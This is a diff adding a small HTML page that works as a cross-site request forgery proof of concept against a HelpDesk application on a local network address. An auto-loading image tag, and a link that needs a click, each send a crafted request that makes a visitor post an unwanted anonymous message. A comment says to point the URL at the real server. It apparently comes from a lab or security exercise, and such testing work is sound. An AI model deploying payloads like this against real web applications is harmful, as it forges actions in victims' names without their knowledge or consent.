@@ -1,0 +1,9 @@
+<html>
+<body>
+	<p>The img forces an anonymous user to enter a message they did not want.</p>
+	
+	<!-- this link also does the same thing but requires clicking. Note, change the URL to the actual web server hosted.-->
+	<a href="http://192.168.0.205/HelpDesk/HDcontroller.php?obj={%22mode%22:%22setMessageAnon%22,%20%22strMessage%22:%22unwanted%20message%22}">Click for CSRF!</a> <p>
+	<img src="http://192.168.0.205/HelpDesk/HDcontroller.php?obj={%22mode%22:%22setMessageAnon%22,%20%22strMessage%22:%22unwanted%20message%22}" alt="CSRF">
+</body>
+</html>
